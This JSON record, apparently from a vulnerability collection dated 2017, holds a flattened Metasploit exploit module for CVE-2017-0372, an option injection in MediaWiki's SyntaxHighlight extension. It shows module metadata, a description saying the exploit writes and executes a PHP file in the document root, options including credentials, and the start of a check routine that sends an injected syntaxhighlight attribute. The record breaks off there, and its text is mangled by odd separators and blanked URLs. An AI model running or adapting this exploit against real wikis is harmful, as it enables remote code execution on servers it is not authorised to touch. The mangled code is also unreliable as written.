{
    "text": "vul_name : MediaWiki SyntaxHighlight Extension Option Injection ， vul_cve : CVE-2017-0372 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， class MetasploitModule < Msf : Exploit : Remote ， Rank = GoodRanking ， include Msf : Exploit : Remote : HttpClient ， super ( update_info ( info ,  ， 'Name' => 'MediaWiki SyntaxHighlight extension option injection vulnerability' ,  ， 'Description' => %q{ ， This module exploits an option injection vulnerability in the SyntaxHighlight ， extension of MediaWiki. It tries to create & execute a PHP file in the document root. ， The USERNAME & PASSWORD options are only needed if the Wiki is configured as private. ， This vulnerability affects any MediaWiki installation with SyntaxHighlight version 2.0 ， installed & enabled. This extension ships with the AIO package of MediaWiki version ， 1.27.x & 1.28.x. A fix for this issue is included in MediaWiki version 1.28.2 and ， version 1.27.3. ， } ,  ， 'Author' => 'Yorick Koster' ,  ， 'License' => MSF_LICENSE ,  ， 'Platform' => 'php' ,  ， 'Payload' => { 'BadChars' => \" # { ( 0x1.0x1f ) .to_a.pack ( 'C * ' ) } , '\\\" } ,  ， ' ，  [  ，  [ 'CVE' , '2017-0372' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ，  ]  ,  ， 'Arch' => ARCH_PHP ,  ， 'Targets' => ，  [  ，  [ 'Automatic Targeting' , { 'auto' => true } ]  ,  ，  ]  ,  ， 'DefaultTarget' => 0 ,  ， 'DisclosureDate' => 'Apr 06 2017' )  ， register_options (  ，  [  ， OptString.new ( 'TARGETURI' ,  [ true , \"MediaWiki base path ( eg , /w , /wiki , /mediawiki ) \" , '/wiki' ]  )  ,  ， OptString.new ( 'UPLOADPATH' ,  [ true , \"Relative local upload path\" , 'images' ]  )  ,  ， OptString.new ( 'USERNAME' ,  [ false , \"Username to authenticate with\" , ' ]  )  ,  ， OptString.new ( 'PASSWORD' ,  [ false , \"Password to authenticate with\" , ' ]  )  ,  ， OptBool.new ( 'CLEANUP' ,  [ false , \"Delete created PHP file?\" , true ]  )  ，  ]  )  ， end ， def check ， res = send_request_cgi ( { ， 'method' => 'POST' ,  ， 'uri' => normalize_uri ( target_uri.path , 'api.php' )  ,  ， 'cookie' => @ cookie ,  ， 'vars_post' => { ， 'action' => 'parse' ,  ， 'format' => 'json' ,  ， 'contentmodel' => 'wikitext' ,  ， 'text' => '<syntaxhighlight lang=\"java\" start=\"0 , full=1\"></syntaxhighlight>' ， } ， } ) ",
    "time": "2017.05.23"
}